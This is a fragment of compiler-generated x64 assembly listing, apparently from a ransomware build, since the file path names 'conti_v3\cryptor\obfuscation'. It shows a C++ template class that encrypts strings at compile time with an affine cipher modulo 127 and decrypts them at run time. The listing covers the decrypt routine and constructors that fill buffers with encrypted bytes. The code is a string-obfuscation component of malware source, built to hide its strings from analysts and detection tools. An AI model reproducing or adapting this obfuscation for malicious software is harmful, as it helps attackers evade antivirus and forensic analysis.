?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 32	 mov	 BYTE PTR [rcx+3], 50	; 00000032H
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 29	 mov	 BYTE PTR [rcx+5], 41	; 00000029H
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 0c	 mov	 BYTE PTR [rcx+7], 12
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 73	 mov	 BYTE PTR [rcx+9], 115	; 00000073H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	c6 41 0b 5f	 mov	 BYTE PTR [rcx+11], 95	; 0000005fH
  0002f	c6 41 0c 27	 mov	 BYTE PTR [rcx+12], 39	; 00000027H
  00033	c6 41 0d 7c	 mov	 BYTE PTR [rcx+13], 124	; 0000007cH
  00037	c6 41 0e 27	 mov	 BYTE PTR [rcx+14], 39	; 00000027H
  0003b	c6 41 0f 39	 mov	 BYTE PTR [rcx+15], 57	; 00000039H
  0003f	c6 41 10 27	 mov	 BYTE PTR [rcx+16], 39	; 00000027H
  00043	c6 41 11 29	 mov	 BYTE PTR [rcx+17], 41	; 00000029H
  00047	c6 41 12 27	 mov	 BYTE PTR [rcx+18], 39	; 00000027H
  0004b	c6 41 13 5f	 mov	 BYTE PTR [rcx+19], 95	; 0000005fH
  0004f	c6 41 14 27	 mov	 BYTE PTR [rcx+20], 39	; 00000027H
  00053	c6 41 15 04	 mov	 BYTE PTR [rcx+21], 4
  00057	c6 41 16 27	 mov	 BYTE PTR [rcx+22], 39	; 00000027H
  0005b	c6 41 17 39	 mov	 BYTE PTR [rcx+23], 57	; 00000039H
  0005f	c6 41 18 27	 mov	 BYTE PTR [rcx+24], 39	; 00000027H
  00063	c6 41 19 5c	 mov	 BYTE PTR [rcx+25], 92	; 0000005cH
  00067	c6 41 1a 27	 mov	 BYTE PTR [rcx+26], 39	; 00000027H
  0006b	c6 41 1b 5f	 mov	 BYTE PTR [rcx+27], 95	; 0000005fH
  0006f	c6 41 1c 27	 mov	 BYTE PTR [rcx+28], 39	; 00000027H
  00073	c6 41 1d 1b	 mov	 BYTE PTR [rcx+29], 27
  00077	c6 41 1e 27	 mov	 BYTE PTR [rcx+30], 39	; 00000027H
  0007b	c6 41 1f 0b	 mov	 BYTE PTR [rcx+31], 11
  0007f	c6 41 20 27	 mov	 BYTE PTR [rcx+32], 39	; 00000027H
  00083	c6 41 21 30	 mov	 BYTE PTR [rcx+33], 48	; 00000030H
  00087	c6 41 22 27	 mov	 BYTE PTR [rcx+34], 39	; 00000027H
  0008b	c6 41 23 5f	 mov	 BYTE PTR [rcx+35], 95	; 0000005fH
  0008f	c6 41 24 27	 mov	 BYTE PTR [rcx+36], 39	; 00000027H
  00093	c6 41 25 1b	 mov	 BYTE PTR [rcx+37], 27
  00097	c6 41 26 27	 mov	 BYTE PTR [rcx+38], 39	; 00000027H
  0009b	c6 41 27 40	 mov	 BYTE PTR [rcx+39], 64	; 00000040H
  0009f	c6 41 28 27	 mov	 BYTE PTR [rcx+40], 39	; 00000027H
  000a3	c6 41 29 65	 mov	 BYTE PTR [rcx+41], 101	; 00000065H
  000a7	c6 41 2a 27	 mov	 BYTE PTR [rcx+42], 39	; 00000027H
  000ab	c6 41 2b 39	 mov	 BYTE PTR [rcx+43], 57	; 00000039H
  000af	c6 41 2c 27	 mov	 BYTE PTR [rcx+44], 39	; 00000027H
  000b3	c6 41 2d 5f	 mov	 BYTE PTR [rcx+45], 95	; 0000005fH
  000b7	c6 41 2e 27	 mov	 BYTE PTR [rcx+46], 39	; 00000027H
  000bb	c6 41 2f 48	 mov	 BYTE PTR [rcx+47], 72	; 00000048H
  000bf	c6 41 30 27	 mov	 BYTE PTR [rcx+48], 39	; 00000027H
  000c3	c6 41 31 12	 mov	 BYTE PTR [rcx+49], 18
  000c7	c6 41 32 27	 mov	 BYTE PTR [rcx+50], 39	; 00000027H
  000cb	c6 41 33 38	 mov	 BYTE PTR [rcx+51], 56	; 00000038H
  000cf	c6 41 34 27	 mov	 BYTE PTR [rcx+52], 39	; 00000027H
  000d3	c6 41 35 5f	 mov	 BYTE PTR [rcx+53], 95	; 0000005fH
  000d7	c6 41 36 27	 mov	 BYTE PTR [rcx+54], 39	; 00000027H
  000db	c6 41 37 44	 mov	 BYTE PTR [rcx+55], 68	; 00000044H
  000df	c6 41 38 27	 mov	 BYTE PTR [rcx+56], 39	; 00000027H
  000e3	c6 41 39 39	 mov	 BYTE PTR [rcx+57], 57	; 00000039H
  000e7	c6 41 3a 27	 mov	 BYTE PTR [rcx+58], 39	; 00000027H
  000eb	c6 41 3b 73	 mov	 BYTE PTR [rcx+59], 115	; 00000073H
  000ef	c6 41 3c 27	 mov	 BYTE PTR [rcx+60], 39	; 00000027H
  000f3	c6 41 3d 2d	 mov	 BYTE PTR [rcx+61], 45	; 0000002dH
  000f7	c6 41 3e 27	 mov	 BYTE PTR [rcx+62], 39	; 00000027H
  000fb	c6 41 3f 32	 mov	 BYTE PTR [rcx+63], 50	; 00000032H
  000ff	c6 41 40 27	 mov	 BYTE PTR [rcx+64], 39	; 00000027H
  00103	c6 41 41 12	 mov	 BYTE PTR [rcx+65], 18
  00107	c6 41 42 27	 mov	 BYTE PTR [rcx+66], 39	; 00000027H
  0010b	c6 41 43 73	 mov	 BYTE PTR [rcx+67], 115	; 00000073H
  0010f	c6 41 44 27	 mov	 BYTE PTR [rcx+68], 39	; 00000027H
  00113	c6 41 45 01	 mov	 BYTE PTR [rcx+69], 1
  00117	c6 41 46 27	 mov	 BYTE PTR [rcx+70], 39	; 00000027H
  0011b	c6 41 47 30	 mov	 BYTE PTR [rcx+71], 48	; 00000030H
  0011f	c6 41 48 27	 mov	 BYTE PTR [rcx+72], 39	; 00000027H
  00123	c6 41 49 30	 mov	 BYTE PTR [rcx+73], 48	; 00000030H
  00127	c6 41 4a 27	 mov	 BYTE PTR [rcx+74], 39	; 00000027H
  0012b	c6 41 4b 0b	 mov	 BYTE PTR [rcx+75], 11
  0012f	c6 41 4c 27	 mov	 BYTE PTR [rcx+76], 39	; 00000027H
  00133	c6 41 4d 30	 mov	 BYTE PTR [rcx+77], 48	; 00000030H
  00137	c6 41 4e 27	 mov	 BYTE PTR [rcx+78], 39	; 00000027H
  0013b	c6 41 4f 5f	 mov	 BYTE PTR [rcx+79], 95	; 0000005fH
  0013f	c6 41 50 27	 mov	 BYTE PTR [rcx+80], 39	; 00000027H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 72	 mov	 BYTE PTR [rcx+81], 114	; 00000072H
  00147	c6 41 52 27	 mov	 BYTE PTR [rcx+82], 39	; 00000027H
  0014b	c6 41 53 5f	 mov	 BYTE PTR [rcx+83], 95	; 0000005fH
  0014f	c6 41 54 27	 mov	 BYTE PTR [rcx+84], 39	; 00000027H
  00153	c6 41 55 48	 mov	 BYTE PTR [rcx+85], 72	; 00000048H
  00157	c6 41 56 27	 mov	 BYTE PTR [rcx+86], 39	; 00000027H
  0015b	c6 41 57 65	 mov	 BYTE PTR [rcx+87], 101	; 00000065H
  0015f	c6 41 58 27	 mov	 BYTE PTR [rcx+88], 39	; 00000027H
  00163	c6 41 59 55	 mov	 BYTE PTR [rcx+89], 85	; 00000055H
  00167	c6 41 5a 27	 mov	 BYTE PTR [rcx+90], 39	; 00000027H
  0016b	c6 41 5b 27	 mov	 BYTE PTR [rcx+91], 39	; 00000027H
  0016f	c6 41 5c 27	 mov	 BYTE PTR [rcx+92], 39	; 00000027H
  00173	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00177	48 8b c1	 mov	 rax, rcx
  0017a	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 56 00 00
	00		 mov	 r11d, 86		; 00000056H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 3a	 sub	 ecx, 58			; 0000003aH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 73	 mov	 BYTE PTR [rcx+1], 115	; 00000073H
  00007	c6 41 02 3a	 mov	 BYTE PTR [rcx+2], 58	; 0000003aH
  0000b	c6 41 03 17	 mov	 BYTE PTR [rcx+3], 23
  0000f	c6 41 04 3a	 mov	 BYTE PTR [rcx+4], 58	; 0000003aH
  00013	c6 41 05 11	 mov	 BYTE PTR [rcx+5], 17
  00017	c6 41 06 3a	 mov	 BYTE PTR [rcx+6], 58	; 0000003aH
  0001b	c6 41 07 28	 mov	 BYTE PTR [rcx+7], 40	; 00000028H
  0001f	c6 41 08 3a	 mov	 BYTE PTR [rcx+8], 58	; 0000003aH
  00023	c6 41 09 18	 mov	 BYTE PTR [rcx+9], 24
  00027	c6 41 0a 3a	 mov	 BYTE PTR [rcx+10], 58	; 0000003aH
  0002b	c6 41 0b 35	 mov	 BYTE PTR [rcx+11], 53	; 00000035H
  0002f	c6 41 0c 3a	 mov	 BYTE PTR [rcx+12], 58	; 0000003aH
  00033	c6 41 0d 1e	 mov	 BYTE PTR [rcx+13], 30
  00037	c6 41 0e 3a	 mov	 BYTE PTR [rcx+14], 58	; 0000003aH
  0003b	c6 41 0f 46	 mov	 BYTE PTR [rcx+15], 70	; 00000046H
  0003f	c6 41 10 3a	 mov	 BYTE PTR [rcx+16], 58	; 0000003aH
  00043	c6 41 11 18	 mov	 BYTE PTR [rcx+17], 24
  00047	c6 41 12 3a	 mov	 BYTE PTR [rcx+18], 58	; 0000003aH
  0004b	c6 41 13 35	 mov	 BYTE PTR [rcx+19], 53	; 00000035H
  0004f	c6 41 14 3a	 mov	 BYTE PTR [rcx+20], 58	; 0000003aH
  00053	c6 41 15 32	 mov	 BYTE PTR [rcx+21], 50	; 00000032H
  00057	c6 41 16 3a	 mov	 BYTE PTR [rcx+22], 58	; 0000003aH
  0005b	c6 41 17 75	 mov	 BYTE PTR [rcx+23], 117	; 00000075H
  0005f	c6 41 18 3a	 mov	 BYTE PTR [rcx+24], 58	; 0000003aH
  00063	c6 41 19 39	 mov	 BYTE PTR [rcx+25], 57	; 00000039H
  00067	c6 41 1a 3a	 mov	 BYTE PTR [rcx+26], 58	; 0000003aH
  0006b	c6 41 1b 46	 mov	 BYTE PTR [rcx+27], 70	; 00000046H
  0006f	c6 41 1c 3a	 mov	 BYTE PTR [rcx+28], 58	; 0000003aH
  00073	c6 41 1d 35	 mov	 BYTE PTR [rcx+29], 53	; 00000035H
  00077	c6 41 1e 3a	 mov	 BYTE PTR [rcx+30], 58	; 0000003aH
  0007b	c6 41 1f 2c	 mov	 BYTE PTR [rcx+31], 44	; 0000002cH
  0007f	c6 41 20 3a	 mov	 BYTE PTR [rcx+32], 58	; 0000003aH
  00083	c6 41 21 75	 mov	 BYTE PTR [rcx+33], 117	; 00000075H
  00087	c6 41 22 3a	 mov	 BYTE PTR [rcx+34], 58	; 0000003aH
  0008b	c6 41 23 1f	 mov	 BYTE PTR [rcx+35], 31
  0008f	c6 41 24 3a	 mov	 BYTE PTR [rcx+36], 58	; 0000003aH
  00093	c6 41 25 46	 mov	 BYTE PTR [rcx+37], 70	; 00000046H
  00097	c6 41 26 3a	 mov	 BYTE PTR [rcx+38], 58	; 0000003aH
  0009b	c6 41 27 35	 mov	 BYTE PTR [rcx+39], 53	; 00000035H
  0009f	c6 41 28 3a	 mov	 BYTE PTR [rcx+40], 58	; 0000003aH
  000a3	c6 41 29 50	 mov	 BYTE PTR [rcx+41], 80	; 00000050H
  000a7	c6 41 2a 3a	 mov	 BYTE PTR [rcx+42], 58	; 0000003aH
  000ab	c6 41 2b 2c	 mov	 BYTE PTR [rcx+43], 44	; 0000002cH
  000af	c6 41 2c 3a	 mov	 BYTE PTR [rcx+44], 58	; 0000003aH
  000b3	c6 41 2d 1b	 mov	 BYTE PTR [rcx+45], 27
  000b7	c6 41 2e 3a	 mov	 BYTE PTR [rcx+46], 58	; 0000003aH
  000bb	c6 41 2f 35	 mov	 BYTE PTR [rcx+47], 53	; 00000035H
  000bf	c6 41 30 3a	 mov	 BYTE PTR [rcx+48], 58	; 0000003aH
  000c3	c6 41 31 23	 mov	 BYTE PTR [rcx+49], 35	; 00000023H
  000c7	c6 41 32 3a	 mov	 BYTE PTR [rcx+50], 58	; 0000003aH
  000cb	c6 41 33 46	 mov	 BYTE PTR [rcx+51], 70	; 00000046H
  000cf	c6 41 34 3a	 mov	 BYTE PTR [rcx+52], 58	; 0000003aH
